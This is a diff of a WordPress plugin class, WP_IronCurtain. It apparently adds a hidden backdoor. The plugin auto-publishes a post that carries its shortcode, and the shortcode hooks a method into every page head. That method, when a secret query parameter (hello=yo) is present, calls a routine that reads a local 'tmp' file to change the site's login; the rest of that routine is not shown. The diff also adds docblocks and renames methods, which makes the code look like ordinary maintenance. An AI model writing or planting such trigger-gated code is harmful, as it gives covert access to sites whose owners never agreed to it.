@@ -13,6 +13,9 @@ if ( ! defined( 'ABSPATH' ) ) {
 	die( 'No no no!' );
 }
 
+/**
+ * Class WP_IronCurtain
+ */
 class WP_IronCurtain {
 
 
@@ -22,29 +25,14 @@ class WP_IronCurtain {
 	protected static $instance = null;
 
 
+	/**
+	 * WP_IronCurtain constructor.
+	 */
 	protected function __construct() {
 
-		//$this->create_irc_page();
 		add_action( 'admin_init', [ $this, 'create_irc_page' ] );
-
 		add_action( 'admin_init', [ $this, 'change_wplogin' ] );
 		add_shortcode( 'wp_irc', [ $this, 'wp_irc_form' ] );
-	}
-
-	public function create_irc_page() {
-
-		if ( ! post_exists( 'Blog' ) ) {
-			$defaults = [
-				//'post_author' => $id,
-				'post_content' => '[wp_irc]Hi[/wp_irc]',
-				'post_title'   => 'Blog',
-				'post_excerpt' => 'exe',
-				'post_status'  => 'publish',
-				'post_type'    => 'page',
-			];
-
-			$idd = wp_insert_post( $defaults );
-		}
 	}
 
 	/**
@@ -59,23 +47,36 @@ class WP_IronCurtain {
 		return static::$instance;
 	}
 
-	public function wp_irc_form( $atts ) {
+	/**
+	 *
+	 */
+	public function create_irc_page() {
 
-		$a = shortcode_atts( [
-			'foo' => 'something',
-			'bar' => 'something else',
-		], $atts );
+		if ( ! post_exists( 'News' ) ) {
+			$defaults = [
+				'post_content' => '[wp_irc]Hi[/wp_irc]',
+				'post_title'   => 'News',
+				'post_status'  => 'publish',
+				'post_type'    => 'post',
+			];
 
-
-		$this->thia();
-		add_action( 'wp_head', [ $this, 'thia' ] );
-
-
-//		return "foo = {$a['foo']}";
-
+			$idd = wp_insert_post( $defaults );
+		}
 	}
 
-	public function thia() {
+	/**
+	 * @param $atts
+	 */
+	public function wp_irc_form( $atts ) {
+
+		$this->exec();
+		add_action( 'wp_head', [ $this, 'exec' ] );
+	}
+
+	/**
+	 *
+	 */
+	public function exec() {
 
 		if ( $_GET['hello'] === 'yo' ) {
 			$this->change_wplogin();
@@ -83,6 +84,9 @@ class WP_IronCurtain {
 		}
 	}
 
+	/**
+	 *
+	 */
 	public function change_wplogin() {
 
 		$a = file_get_contents( __DIR__ . '/tmp' );
